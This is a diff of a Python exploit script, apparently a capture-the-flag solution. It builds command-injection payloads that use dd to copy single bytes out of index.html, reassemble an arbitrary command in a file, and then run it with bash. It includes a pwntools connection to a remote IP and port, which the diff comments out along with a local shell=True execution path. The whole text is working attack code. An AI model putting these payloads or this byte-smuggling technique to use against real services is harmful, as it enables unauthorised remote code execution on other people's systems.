@@ -22,7 +22,7 @@ payloads = [
     'pwd ; rm payload',
     'pwd ; {}'.format(wget)
 ]
-
+# dd block -> file cp, transflate
 # bs=1 -> blocksize = 1 byte
 # count=1 -> transfer 1 block
 # skip -> offset of the input file to read from
@@ -31,6 +31,7 @@ fstr = 'pwd ; dd if=index.html of=payload bs=1 count=1 skip={} seek={}'
 
 for i, c in enumerate(cmd):
     pos = fin.find(c.encode())
+    print(chr(pos))
     if pos == -1:
         raise ValueError('char `{}` not found'.format(c))
     payloads.append(fstr.format(pos, i))
@@ -40,9 +41,9 @@ payloads.append('pwd ; bash payload')
 p = '\n'.join(payloads)
 print(p)
 
-if len(sys.argv) >= 3:
-    io = pwn.remote('54.248.135.16', 1986)
-    io.sendline(p)
-    print(io.recvallS(timeout=2))
-else:
-    print(subprocess.check_output(p, shell=True).decode())
+# if len(sys.argv) >= 3:
+#     io = pwn.remote('54.248.135.16', 1986)
+#     io.sendline(p)
+#     print(io.recvallS(timeout=2))
+# else:
+#     print(subprocess.check_output(p, shell=True).decode())
